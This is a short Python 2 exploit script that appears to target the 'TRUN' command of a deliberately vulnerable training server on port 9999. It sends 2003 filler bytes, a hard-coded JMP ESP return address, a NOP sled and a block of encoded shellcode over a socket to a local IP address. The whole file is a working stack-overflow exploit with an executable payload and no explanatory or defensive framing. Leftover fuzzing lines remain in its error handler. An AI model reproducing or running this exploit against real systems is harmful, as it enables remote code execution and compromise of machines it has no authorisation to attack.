#!/usr/bin/python
import sys, socket
from time import sleep
buffer = "A" * 100

###JMP ESP = FFE4
### 625011AF >> "\xaf\x11\x50\x62"

overflow = ("\xdb\xc8\xd9\x74\x24\xf4\x5a\xb8\x89\x2b\xb0\xdd\x29\xc9\xb1"
"\x52\x31\x42\x17\x03\x42\x17\x83\x63\xd7\x52\x28\x8f\xc0\x11"
"\xd3\x6f\x11\x76\x5d\x8a\x20\xb6\x39\xdf\x13\x06\x49\x8d\x9f"
"\xed\x1f\x25\x2b\x83\xb7\x4a\x9c\x2e\xee\x65\x1d\x02\xd2\xe4"
"\x9d\x59\x07\xc6\x9c\x91\x5a\x07\xd8\xcc\x97\x55\xb1\x9b\x0a"
"\x49\xb6\xd6\x96\xe2\x84\xf7\x9e\x17\x5c\xf9\x8f\x86\xd6\xa0"
"\x0f\x29\x3a\xd9\x19\x31\x5f\xe4\xd0\xca\xab\x92\xe2\x1a\xe2"
"\x5b\x48\x63\xca\xa9\x90\xa4\xed\x51\xe7\xdc\x0d\xef\xf0\x1b"
"\x6f\x2b\x74\xbf\xd7\xb8\x2e\x1b\xe9\x6d\xa8\xe8\xe5\xda\xbe"
"\xb6\xe9\xdd\x13\xcd\x16\x55\x92\x01\x9f\x2d\xb1\x85\xfb\xf6"
"\xd8\x9c\xa1\x59\xe4\xfe\x09\x05\x40\x75\xa7\x52\xf9\xd4\xa0"
"\x97\x30\xe6\x30\xb0\x43\x95\x02\x1f\xf8\x31\x2f\xe8\x26\xc6"
"\x50\xc3\x9f\x58\xaf\xec\xdf\x71\x74\xb8\x8f\xe9\x5d\xc1\x5b"
"\xe9\x62\x14\xcb\xb9\xcc\xc7\xac\x69\xad\xb7\x44\x63\x22\xe7"
"\x75\x8c\xe8\x80\x1c\x77\x7b\x6f\x48\x68\xfb\x07\x8b\x96\xea"
"\x8b\x02\x70\x66\x24\x43\x2b\x1f\xdd\xce\xa7\xbe\x22\xc5\xc2"
"\x81\xa9\xea\x33\x4f\x5a\x86\x27\x38\xaa\xdd\x15\xef\xb5\xcb"
"\x31\x73\x27\x90\xc1\xfa\x54\x0f\x96\xab\xab\x46\x72\x46\x95"
"\xf0\x60\x9b\x43\x3a\x20\x40\xb0\xc5\xa9\x05\x8c\xe1\xb9\xd3"
"\x0d\xae\xed\x8b\x5b\x78\x5b\x6a\x32\xca\x35\x24\xe9\x84\xd1"
"\xb1\xc1\x16\xa7\xbd\x0f\xe1\x47\x0f\xe6\xb4\x78\xa0\x6e\x31"
"\x01\xdc\x0e\xbe\xd8\x64\x2e\x5d\xc8\x90\xc7\xf8\x99\x18\x8a"
"\xfa\x74\x5e\xb3\x78\x7c\x1f\x40\x60\xf5\x1a\x0c\x26\xe6\x56"
"\x1d\xc3\x08\xc4\x1e\xc6")

shellcode = "A"*2003 + "\xaf\x11\x50\x62" + "\x90" * 16 + overflow
print(shellcode)
try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(("192.168.31.1",9999))

	s.send('TRUN /.:/'+ shellcode)
	s.close()
	sleep(1)
	buffer = buffer + "A"*100
except:
	print("Fuzzing crashed at %s bytes" % str(len(buffer)))
	sys.exit()